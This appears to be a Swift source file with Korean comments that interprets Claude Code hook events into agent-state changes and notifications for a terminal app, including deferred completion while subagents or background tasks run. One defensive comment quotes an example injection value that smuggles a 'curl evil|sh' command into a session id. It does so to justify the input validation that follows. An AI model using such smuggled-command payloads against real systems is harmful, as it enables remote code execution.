import Foundation

/// 한 탭(세션)에서 훅 이벤트를 가로질러 유지해야 하는 상태(순수 값).
///
/// 왜 상태가 필요한가 — 훅은 이벤트마다 **다른 필드**를 준다. 특히 `Notification(idle_prompt)`
/// payload에는 `background_tasks`가 **없다**. 그래서 `Stop` 시점에 본 배경작업 유무를 캐시해두고
/// 나중에 읽어야 한다. 이걸 모르면 배경작업이 도는데도 "완료" 알림이 나간다.
struct HookSessionState: Equatable {
    /// 마지막 Stop에서 본 배경 작업 유무(캐시). idle_prompt 게이팅의 유일한 근거.
    var pendingBackgroundWork = false
    /// 살아있는 서브에이전트 수 — 리드가 Stop해도 이게 0이 아니면 완료가 아니다.
    var liveSubagents = 0
    /// 보류된 완료 — **리드가 Stop할 때의 payload를 통째로 들고 있는다.**
    ///
    /// 불리언 플래그로는 안 된다. 보류가 풀리는 순간(마지막 SubagentStop)의 payload는 서브에이전트의 것이라,
    /// 그걸 쓰면 알림 본문이 "서브에이전트가 마지막으로 한 말"이 되고 서브에이전트의 중단 여부가
    /// 리드의 완료 라벨을 덮어쓴다. 완료를 알릴 때 필요한 건 **리드의 마지막 말**이다.
    var deferred: DeferredDone?

    /// 아직 뭔가 돌고 있는가 — 완료 판정의 단일 기준.
    var isBusy: Bool { pendingBackgroundWork || liveSubagents > 0 }
}

/// 보류된 완료가 나중에 발사될 때 쓸, Stop 시점에 얼어붙은 정보(순수 값).
struct DeferredDone: Equatable {
    var title: String
    var body: String
    var transcriptPath: String?
}

/// 훅 하나를 해석한 결과(순수 값) — 부작용은 없다. 실제 발사는 TerminalStore가 한다.
struct HookOutcome: Equatable {
    /// 에이전트 상태 전이 신호. nil이면 상태를 바꾸지 않는다(예: 억제된 idle_prompt).
    var state: NotifyState?
    /// 배달 카테고리. nil이면 알림/배지 없음(상태만 갱신).
    var category: NotifyCategory?
    var title: String = ""
    var body: String = ""
    /// working 중 진행 표시("편집 중: TermView.swift") — 탭·푸터에 띄운다. 알림은 아니다.
    var detail: String?
    /// 진행 표시를 지운다(턴이 끝났다) — detail=nil과 구분해야 "변화 없음"과 "지우기"가 안 섞인다.
    var clearsDetail = false
    /// 완료를 보류했다 — 경계가 만료 타이머를 걸어야 한다(푸는 신호가 안 오면 완료가 영구 소실되므로).
    var deferredDone = false
    /// 세션 재개 바인딩(SessionStart에서만).
    var resume: ResumeBinding?
    /// 본문이 비어 transcript 꼬리에서 마지막 assistant 메시지를 보강해야 하는 경로.
    var transcriptPath: String?
    /// 사용자가 방금 입력한 프롬프트(UserPromptSubmit에서만) — 사이드바 행 제목의 출처.
    /// nil = 변화 없음(다른 이벤트) — "지우기"가 아니다. 마지막 프롬프트는 턴이 끝나도 남는다.
    var prompt: AgentPrompt?
}

/// 훅 이벤트 → (상태 전이, 알림 결정) 순수 해석기.
///
/// 설계 근거:
/// - **완료는 사실로 판정한다.** "1.5초 기다려보고 아니면 취소"하는 유예 창(orca)은 모든 완료를
///   늦추면서도 새는 케이스가 남는다. 대신 payload가 직접 말해주는 `background_tasks`·서브에이전트
///   로스터를 본다(cmux) — 추측이 아니라 사실이다.
/// - **승인 대기와 완료는 다른 사건이다.** 카테고리를 갈라 게이트가 각각 판단하게 한다.
/// - **모르는 이벤트·필드는 조용히 통과.** 스키마가 바뀌어도 알림이 통째로 죽지 않는다.
enum ClaudeHookInterpreter {
    /// 알림 본문 최대 길이 — 배너는 어차피 잘린다. 긴 assistant 메시지를 다 실을 이유가 없다.
    static let bodyMax = 180

    /// 이벤트 하나를 해석해 (결과, 다음 세션 상태)를 돌려준다(순수 — self 없음, 부작용 없음).
    static func interpret(
        event: ClaudeHookEvent,
        payload: ClaudeHookPayload,
        state: HookSessionState
    ) -> (outcome: HookOutcome, state: HookSessionState) {
        var next = state
        switch event {
        case .sessionStart:
            // 상태 신호는 없다(세션이 떴을 뿐 작업 중이 아니다). 재개 바인딩만 등록한다.
            //
            // session_id는 **소켓으로 들어온 외부 입력**이다(같은 uid의 아무 프로세스나 쓸 수 있다).
            // 검증 없이 보간하면 `{"session_id":"x\ncurl evil|sh"}`가 그대로 셸에 커밋된다
            // (executeResume이 sendText로 Enter까지 친다). 반드시 안전한 id만 통과시킨다.
            var out = HookOutcome()
            if let sessionId = payload.sessionId, ClaudeSessionIndex.isSafeSessionId(sessionId) {
                // 훅이 자기 session_id를 직접 알려준 것 = **사실**(source: .hook) → 자동 재개 대상.
                // 명령은 muxa가 고정 꼴로 조립하고, id는 위에서 검증했다(임의 셸 명령이 아니다, D2 경계).
                // cwd도 함께 묶는다 — 재개는 **그 폴더에서만** 유효하다(ResumeGate가 실행 직전 대조).
                out.resume = ResumeBinding(command: "claude --resume \(sessionId)",
                                           agentLabel: "claude", cwd: payload.cwd, source: .hook)
            }
            return (out, next)

        case .userPromptSubmit:
            // 새 턴 시작 — 이전 턴의 보류·배경작업·서브에이전트 잔여를 전부 리셋한다.
            next = HookSessionState()
            return (HookOutcome(state: .working, clearsDetail: true,
                                prompt: AgentPrompt.parse(payload.prompt)), next)

        case .preToolUse:
            // AskUserQuestion의 PreToolUse가 곧 "사용자에게 묻는 중"이다 — Claude는 이때
            // Notification 훅을 안 보낸다. 이 한 줄이 승인 대기 감지의 핵심 경로다.
            if payload.toolName == askUserQuestionTool {
                return (HookOutcome(state: .waiting, category: .needsPermission,
                                    title: "입력 대기", body: payload.message ?? "에이전트가 질문했다"), next)
            }
            return (HookOutcome(state: .working,
                                detail: ToolActivity.describe(toolName: payload.toolName, input: payload.toolInput)),
                    next)

        case .subagentStart:
            next.liveSubagents += 1
            return (HookOutcome(state: .working), next)

        case .subagentStop:
            next.liveSubagents = max(0, next.liveSubagents - 1)
            // 리드는 이미 끝났는데 서브에이전트를 기다리던 중이었다면, 마지막 하나가 끝나는 지금이 진짜 완료다.
            // 본문은 **리드가 Stop할 때 얼려둔 것**을 쓴다 — 지금 payload는 서브에이전트의 것이다.
            guard !next.isBusy, let resolved = release(&next) else { return (HookOutcome(), next) }
            return (resolved, next)

        case .stop:
            next.pendingBackgroundWork = payload.hasPendingBackgroundWork
            let done = doneOutcome(payload: payload)
            // 배경 작업이나 서브에이전트가 남았으면 턴이 끝나도 완료가 아니다.
            // (사이드바에 ✅가 뜨는데 백그라운드 리뷰 루프가 도는 상황을 막는다.)
            guard !next.isBusy else {
                next.deferred = DeferredDone(title: done.title, body: done.body,
                                             transcriptPath: done.transcriptPath)
                return (HookOutcome(state: .working, deferredDone: true), next)
            }
            next.deferred = nil
            return (done, next)

        case .notification:
            // notification_type은 여러 값을 갖는다(permission_prompt·idle_prompt·auth_success·
            // elicitation_* 등). "idle이 아니면 전부 입력 대기"로 뭉개면 auth_success 같은 정보성 알림이
            // **긴급 입력 대기 + 주황 테두리 pin**으로 뜬다(pin이라 heartbeat로도 안 풀린다).
            // 그래서 아는 것만 통과시키고 모르는 건 무시한다(allowlist).
            switch payload.notificationType {
            case idleNotificationType:
                // **유휴는 대기가 아니다.** 에이전트가 턴을 끝내고 프롬프트에 앉아 있을 뿐 —
                // 사람이 결정해야 나아가는 waiting(권한·질문)과 다르다. idle 상태로, 알림·배지 없이 조용히.
                // 배경 작업이 돌고 있으면 상태를 건드리지 않는다(idle_prompt엔 background_tasks가 없어 Stop 캐시가 근거).
                guard !next.pendingBackgroundWork else { return (HookOutcome(), next) }
                return (HookOutcome(state: .idle), next)
            case let type? where waitingNotificationTypes.contains(type):
                return (HookOutcome(state: .waiting, category: .needsPermission, title: "입력 대기",
                                    body: clamp(payload.message ?? "에이전트가 기다린다")), next)
            case nil:
                // 종류를 모르면(구버전·스키마 변경) 대기로 본다 — 놓치는 것보다 낫다.
                return (HookOutcome(state: .waiting, category: .needsPermission, title: "입력 대기",
                                    body: clamp(payload.message ?? "에이전트가 기다린다")), next)
            default:
                return (HookOutcome(), next) // 정보성 알림(auth_success 등) — 상태를 건드리지 않는다
            }
        }
    }

    /// 보류된 완료를 꺼내 발사 가능한 결과로 바꾼다(있으면 소비하고 상태에서 지운다).
    private static func release(_ state: inout HookSessionState) -> HookOutcome? {
        guard let deferred = state.deferred else { return nil }
        state.deferred = nil
        return HookOutcome(state: .done, category: .turnComplete, title: deferred.title,
                           body: deferred.body, clearsDetail: true, transcriptPath: deferred.transcriptPath)
    }

    /// **보류 만료(백스톱).** 보류를 걸어놓고 푸는 신호가 영영 안 오는 경로가 실재한다 —
    /// 배경 작업이 끝났다고 Stop이 다시 오지는 않고, 서브에이전트 Stop 훅이 유실될 수도 있다.
    /// 그대로 두면 완료 알림이 **영구 소실**된다. 무음은 오탐보다 나쁘다(이 파일의 원칙) —
    /// 그래서 경계가 `deferredTimeout` 후 이걸 불러 강제로 완료를 낸다. 보류가 없으면 nil(무동작).
    static func expireDeferred(state: HookSessionState) -> (outcome: HookOutcome, state: HookSessionState)? {
        var next = state
        guard let outcome = release(&next) else { return nil }
        // 만료로 완료를 냈으니 로스터도 정리한다 — 안 그러면 다음 Stop이 또 보류에 걸린다.
        next.pendingBackgroundWork = false
        next.liveSubagents = 0
        return (outcome, next)
    }

    /// 보류가 이 시간 안에 안 풀리면 강제로 완료를 낸다. 짧으면 가짜 완료, 길면 알림이 늦는다.
    static let deferredTimeout: TimeInterval = 30

    /// 완료 결과 — 사용자가 끊은 것(중단)과 정상 완료를 가른다. 본문은 "Claude가 마지막으로 한 말".
    /// 본문이 비면 transcriptPath를 실어 보내 경계(파일 IO)가 꼬리에서 보강하게 한다.
    private static func doneOutcome(payload: ClaudeHookPayload) -> HookOutcome {
        let message = payload.lastAssistantMessage.map(clamp)
        return HookOutcome(
            state: .done,
            category: .turnComplete,
            title: payload.isInterrupt ? "중단됨" : "완료",
            body: message ?? "",
            clearsDetail: true,
            transcriptPath: message == nil ? payload.transcriptPath : nil
        )
    }

    /// 본문 절단 — 개행은 공백으로(배너에서 어차피 한 줄로 뭉갠다).
    static func clamp(_ text: String) -> String {
        let flat = text
            .replacingOccurrences(of: "\n", with: " ")
            .trimmingCharacters(in: .whitespacesAndNewlines)
        return flat.count <= bodyMax ? flat : String(flat.prefix(bodyMax)) + "…"
    }

    /// Claude가 사용자에게 되묻는 도구 — 이 도구의 PreToolUse가 "승인/입력 대기"의 신호다.
    private static let askUserQuestionTool = "AskUserQuestion"
    /// 유휴 리마인더 알림 종류.
    private static let idleNotificationType = "idle_prompt"
    /// 사용자가 손대야 진행되는 알림 종류(allowlist) — 이것만 "입력 대기"로 올린다.
    /// 나머지(auth_success·elicitation_complete 등)는 정보성이라 상태를 건드리지 않는다.
    private static let waitingNotificationTypes: Set<String> = [
        "permission_prompt", "agent_needs_input", "elicitation_dialog",
    ]
}
